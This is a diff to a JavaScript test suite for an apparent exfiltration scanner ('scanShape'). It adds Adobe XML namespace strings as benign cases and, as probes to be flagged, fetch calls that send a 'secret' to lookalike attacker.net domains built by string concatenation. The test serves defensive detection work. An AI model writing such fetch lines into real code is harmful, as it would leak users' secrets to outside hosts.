@@ -413,6 +413,7 @@ describe('scanShape', () => {
         'out += \'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\'',
         // pdf.js XFA namespace table (dsh-herta, issue #8).
         'const jl={config:{id:0,check:(e)=>e.startsWith("http://www.xfa.org/schema/xci/")},datasets:{id:2,check:(e)=>e.startsWith("http://www.xfa.org/schema/xfa-datasets/")}}',
+        'pdf:{id:5,check:e=>"http://ns.adobe.com/xdp/pdf/"===e},xdp:{id:11,check:e=>"http://ns.adobe.com/xdp/"===e},xfdf:{id:12,check:e=>"http://ns.adobe.com/xfdf/"===e},xmpmeta:{id:14,check:e=>"http://ns.adobe.com/xmpmeta/"===e}',
       ].join('\n'),
     }))
     expect(destinations).toEqual([])
@@ -428,6 +429,10 @@ describe('scanShape', () => {
       'fetch("http://www.xfa.org" + ".attacker.net/" + secret)',
       'fetch("http://cdn.xfa.org/x")',
       'fetch("http://www.xfa.org.attacker.net/x")',
+      'fetch("http://ns.adobe.com" + ".attacker.net/" + secret)',
+      'fetch("http://cdn.ns.adobe.com/x")',
+      'fetch("http://www.adobe.com/x")',
+      'fetch("http://ns.adobe.com.attacker.net/x")',
     ]
     for (const probe of probes) {
       const { destinations } = scanShape(input({ 'a.js': probe }))
